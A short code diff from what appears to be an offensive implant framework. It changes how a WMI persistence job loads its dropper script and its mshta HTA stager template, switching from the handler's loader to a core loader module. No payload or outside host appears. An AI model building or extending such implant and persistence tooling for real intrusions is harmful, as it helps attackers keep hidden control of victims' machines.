@@ -1,5 +1,6 @@
 import core.job
 import core.implant
+import core.loader
 import uuid
 import string
 import random
@@ -28,8 +29,8 @@ class WMIPersistJob(core.job.Job):
         task =  handler.get_header("Task", False)
         upload = handler.get_header('X-UploadFileJob', False)
         if upload == "true":
-            dropper_script = handler.loader.load_script(self.options.get("LDROPFILE"), self.options)
-            template = handler.loader.load_script("data/stager/js/mshta/template.hta")
+            dropper_script = core.loader.load_script(self.options.get("LDROPFILE"), self.options)
+            template = core.loader.load_script("data/stager/js/mshta/template.hta")
             fdata = handler.post_process_script(dropper_script, template, self.options, self.session, False)
 
             headers = {}
